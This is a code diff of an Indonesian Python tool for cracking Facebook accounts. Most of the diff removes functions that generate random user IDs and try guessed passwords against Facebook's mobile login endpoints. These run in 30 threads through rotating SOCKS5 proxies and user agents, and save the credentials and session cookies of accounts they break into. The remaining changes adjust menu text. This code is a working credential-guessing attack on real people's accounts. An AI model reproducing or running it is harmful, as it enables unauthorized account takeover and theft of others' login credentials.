@@ -111,7 +111,7 @@ def menu():
 		cookie = {'cookie': open(".cokie.txt", "r").read()}
 	except FileNotFoundError:
 		time.sleep(2);sx.Login()
-	prints(f"\n * {biru_m}01{hapus}. CRACK DARI PUBLIK \n * {biru_m}02{hapus}. CLONING RANDOM ACCOUNT OLD \n * {biru_m}03{hapus}. CEK HASIL CRACK & CLONING \n * {biru_m}04{hapus}. ATUR USER AGENT \n * {biru_m}00{hapus}. Keluar {merah}exit program{hapus}")
+	prints(f"\n * {biru_m}01{hapus}. CRACK DARI PUBLIK \n * {biru_m}02{hapus}. CLONING RANDOM ACCOUNT OLD \n * {biru_m}03{hapus}. CEK HASIL CRACK & CLONING \n * {biru_m}04{hapus}. ATUR USER AGENT \n * {biru_m}00{hapus}. {merah}Keluar{hapus}")
 	pil = input(f"\n *{N} menu : ")
 	if pil in[""," "]:
 		print("");prints(Panel("😡[bold red] jangan kosong "));time.sleep(2);menu()
@@ -172,35 +172,9 @@ def cek_hasil():
 		menu()
 	else:menu()
 
-
-def jadul():
-	try:
-		os.mkdir('sempak')
-	except:pass
-	try:
-		os.system('rm -rf sempak/id.txt')
-		print(f"\n * contoh target : 21,250 dll")
-		ay = input(' * angka target  : ').split(',')
-		p = open('sempak/id.txt', 'a')
-		try:
-			for ae in ay:
-				for k in range(4999):
-					us = random.randint(1111, 9999)
-					aa = ae.lower()
-					p.write("\r%s%s"%(aa,us))
-					sys.stdout.flush()
-			p.close()
-		except (KeyError,IOError):
-			input(' * [ \033[1;31menter untuk kembali ke target\033[0m ] ')
-			jadul()
-	except (KeyError, IOError):
-		exit(f" * anda error, ngewe yuk ")
-	old()
-
-
 def set_ua():
 	os.system('rm -rf uaku.txt')
-	print("\n * 01. Gunakan user agent hp sendiri \n * 02. Gunakan user agent bawaan \n * 03. user agent random \n * 04. user agent fb lite \n * 00. Kembali ")
+	print("\n * 01. Gunakan user agent hp sendiri \n * 02. user agent bawaan script \n * 03. user agent random \n * 04. user agent fb lite \n * 05. \033[1;96mmulai crack \n * 00. Kembali ")
 	pil = input(f" \n* pilih : ")
 	if pil in["1","01"]:
            try:os.sytem("rm -rf uaku.txt")
@@ -229,8 +203,10 @@ def set_ua():
 		for i in ua:
 			uas.append(i)
 		print(f" \n * berhasil menyimpan ua fb lite")
-	elif pil in["0", "00"]:
+	elif pil in["5", "05"]:
 		set_ua()
+	elif pil in["0", "00"]:
+		menu()
 	else:
             print(f" * input yang benar");set_ua()
 
@@ -284,248 +260,6 @@ def ua_random():
                     break
         menu()
 
-def old():
-	try:
-		idk = ('sempak/id.txt')
-		for line in open(idk, 'r').readlines():
-			id.append(line.strip())
-	except:
-		prints(' * File [\033[1;31m %s \033[0m] Tidak ada '%(idk));time.sleep(3);old()
-	print(" * total id      : %s"%(len(id)))
-	pwx=input(" * tebak sandi   : ")
-	prints(f'\n * 01. FACEBOOK LITE \n * 02. ALL BROWSER \n * 03. CHROME LINUX')
-	er=input(f'\n * pilih : ')
-	if er in['']:
-		print(f' * pilih salah satu lah');time.sleep(2);old()
-	if er in ['1','01']:
-		print('\n * OK tersimpan di file : %s'%(tanggal))
-		print(' * CP tersimpan di file : %s\n'%(tanggal))
-		with upil(max_workers=30) as laura:
-			for ids in id:
-				try:
-					uid=ids.split(' ')[0]
-					laura.submit(lite, uid, pwx.split(','))
-				except requests.exceptions.ConnectionError:pass
-				except Exception as e:os.sys.exit(e)
-				except:pass
-		exit("\n * crack selesei...\n")
-
-	elif er in['2','02']:
-		print('\n * OK tersimpan di file : %s'%(tanggal))
-		print(' * CP tersimpan di file : %s\n'%(tanggal))
-		with upil(max_workers=30) as laura:
-			for ids in id:
-				try:
-					uid=ids.split(' ')[0]
-					laura.submit(method, uid, pwx.split(','))
-				except requests.exceptions.ConnectionError:pass
-				except Exception as e:os.sys.exit(e)
-				except:pass
-		exit("\n * crack selesei...\n")
-	elif er in['3','03']:
-		print('\n * OK tersimpan di file : %s'%(tanggal))
-		print(' * CP tersimpan di file : %s\n'%(tanggal))
-		with upil(max_workers=30) as laura:
-			for ids in id:
-				try:
-					uid=ids.split(' ')[0]
-					laura.submit(html, uid, pwx.split(','))
-				except requests.exceptions.ConnectionError:pass
-				except Exception as e:os.sys.exit(e)
-				except:pass
-		exit("\n * crack selesei...\n")
-	else:
-		print(' * pilih yg bener');time.sleep(2);old()
-
-def method(user,pwx):
-	global ok,cp,loop
-	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
-	rr = open("uaku.txt", "r").read().splitlines()
-	uaa=random.choice(rr)
-	nip=random.choice(prox)
-	proxs= {'http': 'socks5://'+nip}
-	ses=requests.session()
-	for pw in pwx:
-		head1 = {
-			'Host':'m.facebook.com',
-			'cache-control':'max-age=0',
-			'upgrade-insecure-requests':'1',
-			'user-agent':uaa,
-			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'sec-fetch-mode':'navigate',
-			'sec-fetch-user':'?1',
-			'sec-fetch-dest':'document',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-		}
-		try:
-				r=ses.get(f"https://m.facebook.com/", headers=head1).text.encode('utf-8')
-		except:
-				r=ses.get(f"https://m.facebook.com/", headers=head1).text
-		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
-		head2={
-			'Host':'m.facebook.com',
-			'user-agent':uaa,
-			'content-type':'application/x-www-form-urlencoded',
-			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
-			'accept':'*/*',
-			'origin':'https://m.facebook.com',
-			'sec-fetch-site':'same-origin',
-			'sec-fetch-mode':'cors',
-			'sec-fetch-dest':'empty',
-			'referer':'https://m.facebook.com/',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-		}
-		p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date,headers=head2, proxies=proxs, allow_redirects=False)
-		if "c_user" in ses.cookies.get_dict():
-			cok = ses.cookies.get_dict()
-			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
-			print("\r *\033[1;34m OK ã€‹%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
-			ok.append("%s|%s"%(user, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
-			break
-		elif "checkpoint" in ses.cookies.get_dict():
-			print("\r * \033[1;93mCP ã€‹ %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
-			cp.append("%s|%s"%(user, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
-			break
-		else:
-			continue
-
-	loop+=1
-
-
-def html(user,pwx):
-	global ok,cp,loop
-	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
-	rr = open("uaku.txt", "r").read().splitlines()
-	uaa=random.choice(rr)
-	nip=random.choice(prox)
-	proxs= {'http': 'socks5://'+nip}
-	ses=requests.session()
-	for pw in pwx:
-		head1 = {
-			'Host':'m.facebook.com',
-			'upgrade-insecure-requests':'1',
-			'user-agent':uaa,
-			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'x-requested-with':'web.dassem.websiteanalyzer',
-			'sec-fetch-site':'none',
-			'sec-fetch-mode':'navigate',
-			'sec-fetch-user':'?1',
-			'sec-fetch-dest':'document',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		}
-		try:
-				r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text.encode('utf-8')
-		except:
-				r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text
-		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
-		head2={
-			'Host':'m.facebook.com',
-			'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
-			'user-agent':uaa,
-			'content-type':'application/x-www-form-urlencoded',
-			'accept':'*/*',
-			'origin':'https://m.facebook.com',
-			'x-requested-with':'web.dassem.websiteanalyzer',
-			'sec-fetch-site':'same-origin',
-			'sec-fetch-mode':'cors',
-			'sec-fetch-dest':'empty',
-			'referer':'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-			'accept':'*/*',
-			'origin':'https://m.facebook.com',
-			'sec-fetch-site':'same-origin',
-			'sec-fetch-mode':'cors',
-			'sec-fetch-dest':'empty',
-			'referer':'https://m.facebook.com/',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-		}
-		p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date,headers=head2, proxies=proxs, allow_redirects=False)
-		if "c_user" in ses.cookies.get_dict():
-			cok = ses.cookies.get_dict()
-			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
-			print("\r *\033[1;34m OK ã€‹%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
-			ok.append("%s|%s"%(user, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
-			break
-		elif "checkpoint" in ses.cookies.get_dict():
-			print("\r * \033[1;93mCP ã€‹ %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
-			cp.append("%s|%s"%(user, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
-			break
-		else:
-			continue
-
-	loop+=1
-
-def lite(user,pwx):
-	global ok,cp,loop
-	print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(id),len(ok),len(cp)),end=' ');sys.stdout.flush()
-	rr = open("uaku.txt", "r").read().splitlines()
-	uaa=random.choice(rr)
-	nip=random.choice(prox)
-	proxs= {'http': 'socks5://'+nip}
-	ses=requests.session()
-	for pw in pwx:
-		head1 = {
-			'Host':'m.facebook.com',
-			'upgrade-insecure-requests':'1',
-			'user-agent':'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/315.0.0.18.109;FBDM/DisplayMetrics{density=1.5, width=540, height=960, scaledDensity=1.5, xdpi=221.225, ydpi=221.67201};]',
-			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'x-requested-with':'com.facebook.lite',
-			'sec-fetch-site':'same-origin',
-			'sec-fetch-mode':'navigate',
-			'sec-fetch-user':'?1',
-			'sec-fetch-dest':'document',
-			'referer':'https://m.facebook.com/palanda.elvantan?ref_component=mbasic_home_bookmark&ref_page=%2Fwap%2Fhome.php&refid=7',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-		}
-		r=ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers=head1).text
-		date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw, 'login':'Masuk','bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"', str(r)).group(1)}
-		head2={
-			'Host':'m.facebook.com',
-			'content-length':'186',
-			'cache-control':'max-age=0',
-			'upgrade-insecure-requests':'1',
-			'origin':'https://m.facebook.com',
-			'content-type':'application/x-www-form-urlencoded',
-			'user-agent':'Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/315.0.0.18.109;FBDM/DisplayMetrics{density=1.5, width=540, height=960, scaledDensity=1.5, xdpi=221.225, ydpi=221.67201};]',
-			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'x-requested-with':'com.facebook.lite',
-			'sec-fetch-site':'same-origin',
-			'sec-fetch-mode':'navigate',
-			'sec-fetch-user':'?1',
-			'sec-fetch-dest':'document',
-			'referer':'https://m.facebook.com/?stype=lo&jlou=AffokRwWTYW2rV-o-d_iItugkkR9Vd9bJ0BeUSLjOqT3Y1b6-Jend_QNeClPSJRp19FcwGEuzTU97W8ObSVKPEWMo9FuIs4-i3RVtRZR2AUzTA&smuh=5796&lh=Ac_dnvSUPXoDi71mlTM&refid=17&_rdr',
-			'accept-encoding':'gzip, deflate',
-			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
-		}
-		p=ses.post(f"https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",data=date,headers=head2, proxies=proxs, allow_redirects=False)
-		if "c_user" in ses.cookies.get_dict():
-			cok = ses.cookies.get_dict()
-			koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
-			print("\r *\033[1;34m OK Ã£â‚¬â€¹%s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
-			ok.append("%s|%s"%(user, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
-			break
-		elif "checkpoint" in ses.cookies.get_dict():
-			print("\r * \033[1;93mCP Ã£â‚¬â€¹ %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
-			cp.append("%s|%s"%(user, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
-			break
-		else:
-			continue
-
-	loop+=1
-
 
 if __name__=='__main__':
-	from data import tess
-	tess.set_ua()
+	folder()
